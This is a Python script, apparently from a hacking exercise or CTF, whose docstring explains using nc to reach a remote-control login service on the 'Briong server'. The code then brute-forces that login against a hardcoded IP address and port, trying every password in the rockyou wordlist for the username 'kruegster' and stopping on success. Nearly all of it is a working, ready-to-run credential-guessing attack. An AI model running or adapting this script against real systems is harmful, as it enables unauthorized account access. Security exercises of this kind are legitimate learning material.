"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket

#host = "" # IP address here
#port = 0000 # Port here
host = "142.93.117.193"
port = 1337

wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force(in_username, in_password, count):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            the Briong server.
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    first_data = s.recv(1024)
    username = in_username + "\n"

    print("Response1: " + str(first_data) + " " + str(username), end='')

    s.send(username.encode())

    second_data = s.recv(1024)
    password = in_password + "\n"

    print("Response2: " + str(second_data) + " " + str(password), end='')

    s.send(password.encode())

    third_data = s.recv(1024)
    print("Reponse3: " + repr(str(third_data)))

    is_pass = 0

    if(str(third_data) == "b'Fail\\n'"):
        print("Failure " + str(count))
    else:
        is_pass = 1
        print("Success on attempt " + str(count))

    print("=============================")

    s.close()

    return is_pass

if __name__ == '__main__':
    #brute_force("kruegster1990", "test_password")
    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #s.connect((host, port))

    attempt_counter = 0

    with open(wordlist) as fp:
        line = fp.readline()
        cnt = 1
        while line:
            is_pass = 0
            if (cnt > -1):
                is_pass = brute_force("kruegster", str(line.strip()), cnt)
            	#is_pass = brute_force("kruegster1990", str(line.strip()), cnt)
            else:
                is_pass = 0
                print("Skipped: " + str(cnt))
            #print("Line {}: {}".format(cnt, line.strip()))
            line = fp.readline()
            cnt += 1
            if is_pass == 1:
            	break
